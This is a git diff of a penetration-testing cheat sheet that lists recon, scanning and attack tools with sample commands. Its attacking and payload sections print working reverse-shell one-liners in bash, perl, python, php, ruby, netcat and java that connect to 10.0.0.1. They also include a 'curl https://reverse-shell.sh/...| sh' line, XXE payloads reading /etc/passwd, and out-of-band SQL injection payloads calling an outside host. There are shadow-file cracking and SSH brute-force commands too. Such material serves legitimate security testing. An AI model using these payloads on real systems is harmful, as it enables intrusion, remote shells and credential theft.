@@ -191,65 +191,83 @@ https://portswigger.net/support/using-burp-suites-engagement-tools
 
 ### Google Dorks
 https://www.exploit-db.com/google-hacking-database
+<br># Google Hacking Database
 
 ### Content Security Policy (CSP)
 https://csp-evaluator.withgoogle.com/
+<br># CSP Evaluator allows developers and security experts to check if a Content Security Policy (CSP) serves as a strong mitigation against cross-site scripting attacks.
 
 ### Tiny URLs Services
 https://www.scribd.com/doc/308659143/Cornell-Tech-Url-Shortening-Research
+<br># Cornell Tech Url Shortening Research
 
 https://github.com/utkusen/urlhunter
+<br># urlhunter is a recon tool that allows searching on URLs that are exposed via shortener services such as bit.ly and goo.gl.
 <br>```urlhunter -keywords keywords.txt -date 2020-11-20 -o out.txt```
 
 https://shorteners.grayhatwarfare.com
-Search Shortener Urls
+<br># Search Shortener Urls
 
 ### GraphQL
 https://github.com/doyensec/graph-ql
+<br># A security testing tool to facilitate GraphQL technology security auditing efforts.
 
 https://hackernoon.com/understanding-graphql-part-1-nxm3uv9
+<br># Understanding GraphQL
 
 https://graphql.org/learn/introspection/
+<br># It's often useful to ask a GraphQL schema for information about what queries it supports. GraphQL allows us to do so using the introspection system!
 
 https://jondow.eu/practical-graphql-attack-vectors/
+<br># Practical GraphQL attack vectors
 
 https://lab.wallarm.com/why-and-how-to-disable-introspection-query-for-graphql-apis/
+<br># Why and how to disable introspection query for GraphQL APIs
 
 https://lab.wallarm.com/securing-and-attacking-graphql-part-1-overview/
+<br># Securing GraphQL
 
 https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4
+<br># GraphQL vs REST API model, common security test cases for GraphQL endpoints.
 
 https://the-bilal-rizwan.medium.com/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696
+<br># GraphQL common vulnerabilities & how to exploit them.
 
 ### General
 https://github.com/redhuntlabs/Awesome-Asset-Discovery
+<br># Asset Discovery is the initial phase of any security assessment engagement, be it offensive or defensive. With the evolution of information technology, the scope and definition of assets has also evolved.
 
 https://github.com/phor3nsic/favicon_hash_shodan
-Search for a framework by favicon
+<br># Search for a framework by favicon
 
 https://github.com/crashbrz/WebXmlExploiter/
+<br># The WebXmlExploiter is a tool to exploit exposed by misconfiguration or path traversal web.xml files.
 
 ## Enumerating
 
 ### Fingerprint
 https://github.com/urbanadventurer/WhatWeb
+<br># WhatWeb identifies websites. Its goal is to answer the question, "What is that Website?". WhatWeb recognises web technologies including content management systems (CMS), blogging platforms, statistic/analytics packages, JavaScript libraries, web servers, and embedded devices.
 <br>```whatweb -a 4 -U 'Mozilla' -c 'NAME1=VALUE1; NAME2=VALUE2' -t 20 www.example.com```
 
 https://builtwith.com
+<br># Find out what websites are Built With.
 
 https://www.wappalyzer.com
+<br># Identify technologies on websites.
 
 https://webtechsurvey.com
+<br># Discover what technologies a website is built on or find out what websites use a particular web technology.
 
 https://portswigger.net/bappstore/c9fb79369b56407792a7104e3c4352fb
-Software Vulnerability Scanner Burp Extension
+<br># Software Vulnerability Scanner Burp Extension
 
 https://github.com/GrrrDog/weird_proxies
 <br># It's a cheat sheet about behaviour of various reverse proxies and related attacks.
 
 ### Buckets
-List s3 bucket permissions and keys
 https://aws.amazon.com/cli/
+<br># List s3 bucket permissions and keys
 <br>```aws s3api get-bucket-acl --bucket examples3bucketname```
 <br>```aws s3api get-object-acl --bucket examples3bucketname --key dir/file.ext```
 <br>```aws s3api list-objects --bucket examples3bucketname```
@@ -257,41 +275,51 @@ https://aws.amazon.com/cli/
 <br>```aws s3api get-object --bucket examples3bucketname --key dir/file.ext localfilename.ext```
 <br>```aws s3api put-object --bucket examples3bucketname --key dir/file.ext --body localfilename.ext```
 
-Find interesting Amazon S3 Buckets by watching certificate transparency logs
 https://github.com/eth0izzle/bucket-stream
+<br># Find interesting Amazon S3 Buckets by watching certificate transparency logs
 
-Search Public Buckets
 https://buckets.grayhatwarfare.com/
+<br># Search Public Buckets
 
-Burp Suite extension which can identify and test S3 buckets
 https://github.com/VirtueSecurity/aws-extender
+<br># Burp Suite extension which can identify and test S3 buckets
 
 ### Cloud Enumeration
 https://github.com/andresriancho/enumerate-iam
+<br># Found a set of AWS credentials and have no idea which permissions it might have?
 
 https://github.com/nccgroup/ScoutSuite
+<br># Scout Suite is an open source multi-cloud security-auditing tool, which enables security posture assessment of cloud environments.
 
 https://github.com/toniblyx/prowler
-
-https://github.com/salesforce/endgame
+<br># Prowler is a command line tool that helps you with AWS security assessment, auditing, hardening and incident response.
 
 https://github.com/salesforce/cloudsplaining
+<br># Cloudsplaining is an AWS IAM Security Assessment tool that identifies violations of least privilege and generates a risk-prioritized HTML report.
 
 https://github.com/cloudsploit/scans
+<br># CloudSploit by Aqua is an open-source project designed to allow detection of security risks in cloud infrastructure accounts, including: Amazon Web Services (AWS), Microsoft Azure, Google Cloud Platform (GCP), Oracle Cloud Infrastructure (OCI), and GitHub. These scripts are designed to return a series of potential misconfigurations and security risks.
 
 https://github.com/RhinoSecurityLabs/pacu
+<br># Pacu is an open-source AWS exploitation framework, designed for offensive security testing against cloud environments.
 
 https://github.com/VirtueSecurity/aws-extender
+<br># This Burp Suite extension can identify and test S3 buckets as well as Google Storage buckets and Azure Storage containers for common misconfiguration issues using the boto/boto3 SDK library.
 
 https://github.com/irgoncalves/gcp_security
+<br># This repository is intented to have Google Cloud Security recommended practices, scripts and more.
 
 https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html
+<br># Instance metadata is data about your instance that you can use to configure or manage the running instance. Instance metadata is divided into categories, for example, host name, events, and security groups.
 
 https://cloud.google.com/compute/docs/storing-retrieving-metadata
+<br># Every instance stores its metadata on a metadata server. You can query this metadata server programmatically, from within the instance and from the Compute Engine API. You can query for information about the instance, such as the instance's host name, instance ID, startup and shutdown scripts, custom metadata, and service account information. Your instance automatically has access to the metadata server API without any additional authorization.
 
 https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service
+<br># The Azure Instance Metadata Service (IMDS) provides information about currently running virtual machine instances. You can use it to manage and configure your virtual machines. This information includes the SKU, storage, network configurations, and upcoming maintenance events.
 
 https://www.alibabacloud.com/help/doc-detail/49122.htm
+<br># Metadata of an instance includes basic information of the instance in Alibaba Cloud, such as the instance ID, IP address, MAC addresses of network interface controllers (NICs) bound to the instance, and operating system type.
 
 https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/
 <br># Tutorial on privilege escalation and post exploitation tactics in Google Cloud Platform environments.
@@ -302,45 +330,54 @@ https://github.com/stealthcopter/deepce
 
 ### Visual Identification
 https://github.com/FortyNorthSecurity/EyeWitness
+<br># EyeWitness is designed to take screenshots of websites provide some server header info, and identify default credentials if known.
 <br>```eyewitness --web --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" --threads 10 --timeout 30 --prepend-https -f "${PWD}/subdomains.txt" -d "${PWD}/eyewitness/"```
 
 https://github.com/michenriksen/aquatone
+<br># Aquatone is a tool for visual inspection of websites across a large amount of hosts and is convenient for quickly gaining an overview of HTTP-based attack surface.
 <br>```cat targets.txt | aquatone```
 
 https://github.com/sensepost/gowitness
+<br># gowitness is a website screenshot utility written in Golang, that uses Chrome Headless to generate screenshots of web interfaces using the command line, with a handy report viewer to process results. Both Linux and macOS is supported, with Windows support mostly working.
 <br>```gowitness scan --cidr 192.168.0.0/24 --threads 20```
 
 ## Scanning
 
 ### Static Application Security Testing
 https://github.com/returntocorp/semgrep
-Semgrep is a fast, open-source, static analysis tool that excels at expressing code standards — without complicated queries — and surfacing bugs early at editor, commit, and CI time.
+<br># Semgrep is a fast, open-source, static analysis tool that excels at expressing code standards — without complicated queries — and surfacing bugs early at editor, commit, and CI time.
 
 ### Dependency Confusion (https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610)
 https://github.com/dwisiswant0/nodep
-nodep — check available dependency packages across npmjs, PyPI or RubyGems registry.
+<br># nodep check available dependency packages across npmjs, PyPI or RubyGems registry.
 
 https://github.com/visma-prodsec/confused
-A tool for checking for lingering free namespaces for private package names referenced in dependency configuration for Python (pypi) requirements.txt, JavaScript (npm) package.json, PHP (composer) composer.json or MVN (maven) pom.xml.
+<br># A tool for checking for lingering free namespaces for private package names referenced in dependency configuration for Python (pypi) requirements.txt, JavaScript (npm) package.json, PHP (composer) composer.json or MVN (maven) pom.xml.
 
 ### Send emails (SMTP)
-while read i; do echo $i; echo -e "From: example1@gmail.com\nTo: ${i}\nCc: example2@gmail.com\nSubject: This is the subject ${i}\n\nThis is the body ${i}" | ssmtp ${i},example2@gmail.com; done < emails.txt
-References
-Ticket Trick https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c 
-Abusing autoresponders and email bounces https://medium.com/intigriti/abusing-autoresponders-and-email-bounces-9b1995eb53c2
+https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c
+<br># Ticket Trick
+
+https://medium.com/intigriti/abusing-autoresponders-and-email-bounces-9b1995eb53c2
+<br># Abusing autoresponders and email bounces
+
+<br># Send multiple emails
+<br>```while read i; do echo $i; echo -e "From: example1@gmail.com\nTo: ${i}\nCc: example2@gmail.com\nSubject: This is the subject ${i}\n\nThis is the body ${i}" | ssmtp ${i},example2@gmail.com; done < emails.txt```
 
 ### Search Vulnerabilities
 https://github.com/vulnersCom/getsploit
+<br># Command line search and download tool for Vulners Database inspired by searchsploit.
 <br>```getsploit wordpress 4.7.0```
 
 https://www.exploit-db.com/searchsploit
+<br># Included in our Exploit Database repository on GitHub is searchsploit, a command line search tool for Exploit-DB that also allows you to take a copy of Exploit Database with you, everywhere you go.
 <br>```searchsploit -t oracle windows```
 
 https://github.com/vulmon/Vulmap
-Vulmap is an open-source online local vulnerability scanner project. It consists of online local vulnerability scanning programs for Windows and Linux operating systems.
+<br># Vulmap is an open-source online local vulnerability scanner project. It consists of online local vulnerability scanning programs for Windows and Linux operating systems.
 
 https://grep.app
-Search across a half million git repos.
+<br># Search across a half million git repos.
 
 ### Web Scanning
 https://support.portswigger.net/customer/portal/articles/1783127-using-burp-scanner
@@ -351,12 +388,15 @@ https://github.com/spinkham/skipfish
 <br>```skipfish -MEU -S dictionaries/minimal.wl -W new_dict.wl -C "AuthCookie=value" -X /logout.aspx -o output_dir http://www.example.com/```
 
 https://github.com/sullo/nikto
+<br># Nikto is an Open Source (GPL) web server scanner which performs comprehensive tests against web servers for multiple items, including over 6700 potentially dangerous files/programs, checks for outdated versions of over 1250 servers, and version specific problems on over 270 servers. It also checks for server configuration items such as the presence of multiple index files, HTTP server options, and will attempt to identify installed web servers and software. Scan items and plugins are frequently updated and can be automatically updated.
 <br>```nikto -ssl -host www.example.com```
 
 https://github.com/wpscanteam/wpscan
+<br># WordPress Security Scanner
 <br>```wpscan --disable-tls-checks --ignore-main-redirect --user-agent 'Mozilla' -t 10 --force --wp-content-dir wp-content --url blog.example.com```
 
 https://github.com/droope/droopescan
+<br># A plugin-based scanner that aids security researchers in identifying issues with several CMS.
 <br>```droopescan scan drupal -u example.com```
 
 https://github.com/projectdiscovery/nuclei
@@ -380,106 +420,128 @@ https://github.com/MrCl0wnLab/ShellShockHunter
 
 ### HTTP Request Smuggling
 https://github.com/defparam/smuggler
+<br># An HTTP Request Smuggling / Desync testing tool written in Python 3.
 <br>```python3 smuggler.py -q -u https://example.com/```
 
 https://github.com/BishopFox/h2csmuggler
+<br># h2cSmuggler smuggles HTTP traffic past insecure edge-server proxy_pass configurations by establishing HTTP/2 cleartext (h2c) communications with h2c-compatible back-end servers, allowing a bypass of proxy rules and access controls.
 <br>```h2csmuggler.py -x https://example.com/ --test```
 
 https://github.com/0ang3el/websocket-smuggle
+<br># Smuggling HTTP requests over fake WebSocket connection.
 
 https://portswigger.net/web-security/request-smuggling
+<br># HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users.
 
 https://github.com/PortSwigger/http-request-smuggler
+<br># This is an extension for Burp Suite designed to help you launch HTTP Request Smuggling attacks, originally created during HTTP Desync Attacks research. It supports scanning for Request Smuggling vulnerabilities, and also aids exploitation by handling cumbersome offset-tweaking for you.
 
 https://medium.com/@ricardoiramar/the-powerful-http-request-smuggling-af208fafa142
+<br># This is how I was able to exploit a HTTP Request Smuggling in some Mobile Device Management (MDM) servers and send any MDM command to any device enrolled on them for a private bug bounty program.
 
 ### Subdomain Takeover
 https://github.com/anshumanbh/tko-subs
+<br># Subdomain Takeover Scanner
 <br>```tko-subs -data providers-data.csv -threads 20 -domains subdomains.txt```
 
 https://github.com/Ice3man543/SubOver
+<br># Subover is a Hostile Subdomain Takeover tool originally written in python but rewritten from scratch in Golang. Since it's redesign, it has been aimed with speed and efficiency in mind.
 <br>```SubOver -l subdomains.txt```
 
 ### SQLi
 https://github.com/sqlmapproject/sqlmap
+<br># sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.
 <br>```sqlmap --force-ssl -r RAW_REQUEST.txt --user-agent='Mozilla' --batch```
 <br>```sqlmap -vv -u 'https://www.example.com?id=1*' --user-agent='Mozilla' --level 5 --risk 3 --batch```
 
 ### Repositories Scanning
 https://github.com/zricethezav/gitleaks
+<br># Gitleaks is a SAST tool for detecting hardcoded secrets like passwords, api keys, and tokens in git repos.
 <br>```gitleaks --github-org=organization --threads=4 -v --disk```
 
 https://github.com/michenriksen/gitrob
+<br># Gitrob is a tool to help find potentially sensitive files pushed to public repositories on Github.
 
 https://github.com/dxa4481/truffleHog
+<br># Searches through git repositories for secrets, digging deep into commit history and branches.
 
 https://github.com/awslabs/git-secrets
+<br># Prevents you from committing passwords and other sensitive information to a git repository.
 
 https://github.com/eth0izzle/shhgit
-
-https://www.shhgit.com/
+<br># shhgit helps secure forward-thinking development, operations, and security teams by finding secrets across their code before it leads to a security breach.
 
 ### Google Dorks Scanning
 https://github.com/opsdisk/pagodo
+<br># The goal of this project was to develop a passive Google dork script to collect potentially vulnerable web pages and applications on the Internet.
 <br>```python3 pagodo.py -d example.com -g dorks.txt -l 50 -s -e 35.0 -j 1.1```
 
 ### CORS Misconfigurations
 https://github.com/s0md3v/Corsy
+<br># Corsy is a lightweight program that scans for all known misconfigurations in CORS implementations.
 <br>```python3 corsy.py -u https://example.com```
 
 ## Monitoring
 
 ### CVE
 https://www.opencve.io/
-OpenCVE (formerly known as Saucs.com) allows you to subscribe to vendors and products, and send you an alert as soon as a CVE is published or updated.
+<br># OpenCVE (formerly known as Saucs.com) allows you to subscribe to vendors and products, and send you an alert as soon as a CVE is published or updated.
 
 ## Attacking
 
 ### Brute Force
 https://github.com/vanhauser-thc/thc-hydra
+<br># Number one of the biggest security holes are passwords, as every password security study shows. This tool is a proof of concept code, to give researchers and security consultants the possibility to show how easy it would be to gain unauthorized access from remote to a system.
 <br>```hydra -l root -P 10-million-password-list-top-1000.txt www.example.com -t 4 ssh```
 
 https://www.openwall.com/john/
-<br>```unshadow /etc/passwd /etc/shadow > mypasswd.txt
-john mypasswd.txt```
+<br># John the Ripper is an Open Source password security auditing and password recovery tool available for many operating systems.
+<br>```unshadow /etc/passwd /etc/shadow > mypasswd.txt```
+<br>```john mypasswd.txt```
 
 https://hashcat.net/hashcat/
+<br># Hashcat is a password recovery tool.
 <br>```hashcat -m 0 -a 0 hashes.txt passwords.txt```
 
-Rotate the source IP address in order to bypass rate limits
 https://github.com/ustayready/fireprox
+<br># Rotate the source IP address in order to bypass rate limits
 
 ### Exfiltration
-A bash script that automates the exfiltration of data over dns
 https://github.com/vp777/procrustes
+<br># A bash script that automates the exfiltration of data over dns
 
-The successor to reDuh, pwn a bastion webserver and create SOCKS proxies through the DMZ. Pivot and pwn.
 https://github.com/sensepost/reGeorg
+<br># The successor to reDuh, pwn a bastion webserver and create SOCKS proxies through the DMZ. Pivot and pwn.
 
-This tool can forward TCP traffic over DNS protocol. Non-compile clients + socks5 support.
 https://github.com/fbkcs/ThunderDNS
+<br># This tool can forward TCP traffic over DNS protocol. Non-compile clients + socks5 support.
 
 ## Manual
 
 ### Payloads
 https://github.com/swisskyrepo/PayloadsAllTheThings
-PayloadsAllTheThings
+<br># PayloadsAllTheThings
 
 https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html
-Unicode normalization good for WAF bypass.
+<br># Unicode normalization good for WAF bypass.
   
 XSS
 https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+<br># This cross-site scripting (XSS) cheat sheet contains many vectors that can help you bypass WAFs and filters. You can select vectors by the event, tag or browser and a proof of concept is included for every vector.
 
 XXE
 https://portswigger.net/web-security/xxe
+<br># XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.
 <br>```<?xml version="1.0" encoding="UTF-8"?>```
 <br>```<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>```
 <br>```<stockCheck><productId>&xxe;</productId></stockCheck>```
+
 https://phonexicum.github.io/infosec/xxe.html
+<br># Information Security PENTEST XXE
 <br>```<!DOCTYPE foo SYSTEM "http://xpto.burpcollaborator.net/xpto.dtd">```
+
 https://github.com/GoSecure/dtd-finder
-Identify DTDs on filesystem snapshot and build XXE payloads using those local DTDs.
+<br># Identify DTDs on filesystem snapshot and build XXE payloads using those local DTDs.
 
 SSRF
 https://www.blackhat.com/us-17/briefings.html#a-new-era-of-ssrf-exploiting-url-parser-in-trending-programming-languages
@@ -498,99 +560,113 @@ https://www.blackhat.com/us-17/briefings.html#a-new-era-of-ssrf-exploiting-url-p
 
 ### Deserialization
 https://github.com/joaomatosf/jexboss
+<br># JexBoss is a tool for testing and exploiting vulnerabilities in JBoss Application Server and others Java Platforms, Frameworks, Applications, etc.
 
 https://github.com/pimps/JNDI-Exploit-Kit
+<br># This is a forked modified version of the great exploitation tool created by @welk1n (https://github.com/welk1n/JNDI-Injection-Exploit). 
 
 ### Reusing Cookies
 https://medium.com/@ricardoiramar/reusing-cookies-23ed4691122b
+<br># This is a story how I accidentally found a common vulnerability across similar web applications just by reusing cookies on different subdomains from the same web application.
 
 ### SSRF (Server-Side Request Forgery)
 https://lab.wallarm.com/blind-ssrf-exploitation/
+<br># There is such a thing as SSRF. There’s lots of information about it, but here is my quick summary.
 
 ### DNS Rebinding
 https://github.com/brannondorsey/dns-rebind-toolkit
+<br># DNS Rebind Toolkit is a frontend JavaScript framework for developing DNS Rebinding exploits against vulnerable hosts and services on a local area network (LAN).
 
 https://github.com/brannondorsey/whonow
+<br># A malicious DNS server for executing DNS Rebinding attacks on the fly.
 
 https://nip.io
-
-http://xip.io
+<br># Dead simple wildcard DNS for any IP Address
 
 https://sslip.io
+<br># sslip.io is a DNS (Domain Name System) service that, when queried with a hostname with an embedded IP address, returns that IP Address.
 
 http://1u.ms/
 <br># This is a small set of zero-configuration DNS utilities for assisting in detection and exploitation of SSRF-related vulnerabilities. It provides easy to use DNS rebinding utility, as well as a way to get resolvable resource records with any given contents.
 
 ### SMTP Header Injection
 https://www.acunetix.com/blog/articles/email-header-injection/
-<br>```POST /contact.php HTTP/1.1
-Host: www.example2.com
- 
-name=Best Product\nbcc: everyone@example3.com&replyTo=blame_anna@example.com&message=Buy my product!```
+<br># It is common practice for web pages and web applications to implement contact forms, which in turn send email messages to the intended recipients. Most of the time, such contact forms set headers. These headers are interpreted by the email library on the web server and turned into resulting SMTP commands, which are then processed by the SMTP server.
+<br>```POST /contact.php HTTP/1.1```
+<br>```Host: www.example2.com```
+<br>``` ```
+<br>```name=Best Product\nbcc: everyone@example3.com&replyTo=blame_anna@example.com&message=Buy my product!```
 
 ### Reverse Shell
 http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
-Bash
+<br># If you’re lucky enough to find a command execution vulnerability during a penetration test, pretty soon afterwards you’ll probably want an interactive shell.
+<br># Bash
 <br>```bash -i >& /dev/tcp/10.0.0.1/8080 0>&1```
 
-PERL
+<br># PERL
 <br>```perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'```
 
-Python
+<br># Python
 <br>```python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'```
 
-PHP
+<br># PHP
 <br>```php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'```
 
-Ruby
+<br># Ruby
 <br>```ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'```
 
-Netcat
-<br>```nc -e /bin/sh 10.0.0.1 1234
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f```
+<br># Netcat
+<br>```nc -e /bin/sh 10.0.0.1 1234```
+<br>```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f```
 
-Java
+<br># Java
 <br>```r = Runtime.getRuntime()```
 <br>```p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])```
 <br>```p.waitFor()```
 
-xterm
+<br># xterm
 <br>```xterm -display 10.0.0.1:1```
 <br>```Xnest :1```
 <br>```xhost +targetip```
 
 https://reverse-shell.sh/
+<br># Reverse Shell as a Service
 <br>```nc -l 1337```
 <br>```curl https://reverse-shell.sh/yourip:1337 | sh```
 
 https://github.com/calebstewart/pwncat
+<br># pwncat is a post-exploitation platform for Linux targets.
 
 ### SQLi (SQL Injection)
-DNS Detection
-Oracle
+<br># https://arxiv.org/abs/1303.3047
+<br># This paper describes an advanced SQL injection technique where DNS resolution process is exploited for retrieval of malicious SQL query results.
+<br># DNS Detection
+<br># Oracle
 <br>```'||(SELECT%20UTL_INADDR.GET_HOST_ADDRESS('xpto.example.com'))||'```
 <br>```'||(SELECT%20UTL_HTTP.REQUEST('http://xpto.example.com')%20FROM%20DUAL)||'```
 <br>```'||(SELECT%20HTTPURITYPE('http://xpto.example.com').GETCLOB()%20FROM%20DUAL)||'```
 <br>```'||(SELECT%20DBMS_LDAP.INIT(('xpto.example.com',80)%20FROM%20DUAL)||'```
 
-MySQL
+<br># MySQL
 <br>```'||(SELECT%20LOAD_FILE('\\xpto.example.com'))||'```
 
-Microsoft SQL Server
+<br># Microsoft SQL Server
 <br>```'+;EXEC('master..xp_dirtree"\\xpto.example.com\"');+'```
 <br>```'+;EXEC('master..xp_fileexist"\\xpto.example.com\"');+'```
 <br>```'+;EXEC('master..xp_subdirs"\\xpto.example.com\"');+'```
 
-PostgreSQL
+<br># PostgreSQL
 <br>```'||;COPY%20users(names)%20FROM%20'\\xpto.example.com\';||'```
 
 ### SSTI (Server Side Template Injection)
-<br># Template Injections (SSTI) in 10 minutes
 https://www.youtube.com/watch?v=SN6EVIG4c-0
+<br># Template Injections (SSTI) in 10 minutes
 
 https://portswigger.net/research/server-side-template-injection
+<br># Template engines are widely used by web applications to present dynamic data via web pages and emails. Unsafely embedding user input in templates enables Server-Side Template Injection, a frequently critical vulnerability that is extremely easy to mistake for Cross-Site Scripting (XSS), or miss entirely. Unlike XSS, Template Injection can be used to directly attack web servers' internals and often obtain Remote Code Execution (RCE), turning every vulnerable application into a potential pivot point.
 
 https://github.com/epinna/tplmap
+<br># Tplmap assists the exploitation of Code Injection and Server-Side Template Injection vulnerabilities with a number of sandbox escape techniques to get access to the underlying operating system.
 <br>```tplmap.py --os-shell -u 'http://www.example.com/page?name=John'```
 
 ### WebDAV (Web Distributed Authoring and Versioning)
@@ -601,15 +677,15 @@ https://github.com/cldrn/davtest
 <br># This program attempts to exploit WebDAV enabled servers.
 
 ### Generic Tools
-The Cyber Swiss Army Knife
 https://gchq.github.io/CyberChef/
+<br># The Cyber Swiss Army Knife
 
-Pcap analysis and samples
 https://packettotal.com/
+<br># Pcap analysis and samples
 
 ### General
-<br># A simple HTTP Request & Response Service.
 https://httpbin.org/
+<br># A simple HTTP Request & Response Service.
 
 <br># Fake HTTP Server
 <br>```while true ; do echo -e "HTTP/1.1 200 OK\nContent-Length: 0\n\n" | nc -vl 1.2.3.4 80; done```
@@ -644,8 +720,8 @@ https://httpbin.org/
 <br># Trim space and newlines on bash variable
 <br>```"${i//[$'\t\r\n ']}"```
 
-<br># GTFOBins is a curated list of Unix binaries that can used to bypass local security restrictions in misconfigured systems.
 https://gtfobins.github.io/
+<br># GTFOBins is a curated list of Unix binaries that can used to bypass local security restrictions in misconfigured systems.
 
 <br># Mirror a single page
 <br>```wget -mkEpnp https://www.example.com/```
@@ -653,11 +729,11 @@ https://gtfobins.github.io/
 <br># Referer spoofing
 <br>```<base href="https://www.google.com/">```
 <br>```<style>```
-<br>```    @import 'https://CSRF.vulnerable.example/';```
+<br>```@import 'https://CSRF.vulnerable.example/';```
 <br>```</style>```
 
-<br># Check PreAuth RCE on Palo Alto GlobalProtect
 https://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html
+<br># Check PreAuth RCE on Palo Alto GlobalProtect
 <br>```time curl -s -d 'scep-profile-name=%9999999c' https://${HOST}/sslmgr >/dev/null```
 <br>```time curl -s -d 'scep-profile-name=%99999999c' https://${HOST}/sslmgr >/dev/null```
 <br>```time curl -s -d 'scep-profile-name=%999999999c' https://${HOST}/sslmgr >/dev/null```
